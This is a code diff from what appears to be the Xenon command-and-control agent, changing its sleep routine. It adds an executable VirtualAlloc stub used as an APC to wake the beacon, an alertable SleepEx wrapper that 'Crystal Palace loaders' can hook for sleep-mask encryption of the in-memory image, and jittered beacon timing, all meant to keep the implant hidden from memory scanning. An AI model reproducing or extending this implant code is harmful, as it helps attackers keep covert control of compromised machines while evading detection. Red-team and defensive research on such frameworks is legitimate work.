@@ -3,38 +3,99 @@
 #include "Utils.h"
 #include "Config.h"
 
-#ifdef HTTPX_TRANSPORT
+static HANDLE   g_SleepThread = NULL;
+static PAPCFUNC g_SleepApc    = NULL;
 
-// Function to apply jitter to the sleep time
+static VOID CALLBACK SleepApc(ULONG_PTR param)
+{
+    (void)param;
+}
+
+VOID SleepInit(void)
+{
+    if (!g_SleepApc) {
+        /*
+         * Sleep-mask XOR's the mapped image during SleepEx. The APC must
+         * live in untracked VirtualAlloc so it is safe if it runs while
+         * the DLL is still encrypted (inside the hooked wait).
+         */
+        g_SleepApc = (PAPCFUNC)VirtualAlloc(NULL, 16, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        if (g_SleepApc)
+            *(BYTE *)g_SleepApc = 0xC3; /* ret */
+        else
+            g_SleepApc = SleepApc;
+    }
+
+    if (g_SleepThread)
+        return;
+
+    DuplicateHandle(
+        GetCurrentProcess(),
+        GetCurrentThread(),
+        GetCurrentProcess(),
+        &g_SleepThread,
+        THREAD_SET_CONTEXT,
+        FALSE,
+        0);
+}
+
+VOID SleepWake(void)
+{
+    if (g_SleepThread && g_SleepApc)
+        QueueUserAPC(g_SleepApc, g_SleepThread, 0);
+}
+
+HANDLE SleepThreadHandle(void)
+{
+    return g_SleepThread;
+}
+
+PAPCFUNC SleepWakeApc(void)
+{
+    return g_SleepApc;
+}
+
+/**
+ * @brief HTTPX/WebSocket C2 idle wait.
+ * Always goes through KERNEL32$SleepEx so Crystal Palace loaders can addhook it.
+ * Alertable so BeaconWakeup can interrupt via APC.
+ */
+DWORD SleepIdle(DWORD dwMilliseconds)
+{
+    return SleepEx(dwMilliseconds, TRUE);
+}
+
+#if defined(HTTPX_TRANSPORT) || defined(WEBSOCKET_TRANSPORT)
+
+/**
+ * @brief Core Sleep Routine for the Xenon Agent.
+ * Computes jitter then idles via SleepIdle (KERNEL32$SleepEx).
+ */
 VOID SleepWithJitter(INT baseSleepTime, INT maxJitter) 
 {
     if (baseSleepTime == 0)
-    {
         return;
-    }
     
     if (maxJitter == 0)
-        goto sleep;
+        goto SLEEP;
 
-    // Define limits for jitter
-    const INT minJitter = 1;  // Minimum jitter of 1 second
-    const INT jitterRange = maxJitter / 2;  // Half of maxJitter as range for +/- adjustments
+    const INT minJitter = 1;
+    const INT jitterRange = maxJitter / 2;
 
-    // Generate jitter within the defined range
+    /* Generate jitter within the defined range */
     int Rand = RandomInt32(-jitterRange, jitterRange);
 
-    // Apply jitter to the base sleep time
+    /* Apply jitter to the base sleep time */
     baseSleepTime += Rand;
 
-    // Ensure the sleep time is never below the minimum threshold (e.g., 1 second)
-    if (baseSleepTime < minJitter) {
+    /* Sleep cannot be negative */
+    if (baseSleepTime < minJitter)
         baseSleepTime = minJitter;
-    }
 
-sleep:
+SLEEP:
+
     _dbg("AGENT GOING TO SLEEP : %d seconds", baseSleepTime);
-    // Sleep for the adjusted time (in milliseconds)
-    Sleep(baseSleepTime * 1000);
+    SleepIdle((DWORD)baseSleepTime * 1000);
 }
 
 #else // SMB_TRANSPORT & TCP_TRANSPORT
